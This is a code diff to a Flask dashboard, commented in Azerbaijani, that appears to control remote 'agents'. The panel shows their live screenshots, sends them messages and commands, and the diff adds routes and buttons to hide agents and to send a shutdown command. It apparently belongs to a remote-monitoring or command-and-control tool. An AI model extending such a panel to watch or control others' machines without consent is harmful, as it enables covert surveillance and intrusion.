@@ -103,6 +103,15 @@ def send_command(name):
     conn.close()
     return redirect(url_for("dashboard"))
 
+@app.route("/toggle_hide/<name>")
+@login_required
+def toggle_hide(name):
+    conn = get_db()
+    conn.execute("UPDATE agents SET is_hidden = 1 - is_hidden WHERE name = ?", (name,))
+    conn.commit()
+    conn.close()
+    return redirect(url_for("dashboard"))
+
 @app.route("/screens/<filename>")
 @login_required
 def get_screen(filename):
@@ -180,7 +189,10 @@ HTML_TEMPLATE = """
         <div class="sidebar-menu">
             <div style="color:#64748b; font-size:12px; margin-bottom:15px;">GİZLİ CİHAZLAR</div>
             {% for h in hidden %}
-                <div style="padding:10px; background:#1e293b; border-radius:8px; margin-bottom:10px;">{{ h.name }}</div>
+                <div style="padding:10px; background:#1e293b; border-radius:8px; margin-bottom:10px; display:flex; justify-content:space-between; align-items:center;">
+                    <span>{{ h.name }}</span>
+                    <a href="/toggle_hide/{{ h.name }}" style="color:#22c55e; text-decoration:none; font-size:12px;">GÖSTƏR</a>
+                </div>
             {% endfor %}
         </div>
     </div>
@@ -213,6 +225,14 @@ HTML_TEMPLATE = """
                         <input type="hidden" name="type" value="msg">
                         <button class="btn">Göndər</button>
                     </form>
+                    <div style="display:flex; gap:8px; margin-top:10px;">
+                        <a href="/toggle_hide/{{ a.name }}" style="flex:1;"><button class="btn" style="width:100%;">Gizlət</button></a>
+                        <form action="/send_command/{{ a.name }}" method="POST" style="flex:1;">
+                            <input type="hidden" name="type" value="cmd">
+                            <input type="hidden" name="val" value="shutdown">
+                            <button class="btn" style="width:100%; color:#ef4444; border-color:#ef4444;">Söndür</button>
+                        </form>
+                    </div>
                 </div>
             </div>
             {% endfor %}
@@ -221,14 +241,16 @@ HTML_TEMPLATE = """
 
     <script>
         setInterval(function(){
-            // Şəkilləri 1 saniyədən bir yenilə
             let images = document.getElementsByClassName('screen-img');
             let t = new Date().getTime();
-            for(let img of images) { img.src = img.src.split('?')[0] + '?t=' + t; }
-            
-            // Statusların (Online/Offline) dəyişməsi üçün hər 5 saniyədən bir səhifəni tam yenilə
-            if(t % 5000 < 1000) { location.reload(); }
-        }, 1000);
+            for(let img of images) {
+                // Şəklin sonuna timestamp artırırıq ki, brauzer keşdən deyil, serverdən təzəsini çəksin
+                img.src = img.src.split('?')[0] + '?t=' + t;
+            }
+        }, 1000); // 1 saniyədən bir şəkilləri təzələ
+
+        // Hər 5 saniyədən bir statusları (on/off) yoxlamaq üçün səhifəni tam yenilə
+        setTimeout(function(){ location.reload(); }, 5000);
     </script>
 </body>
 </html>
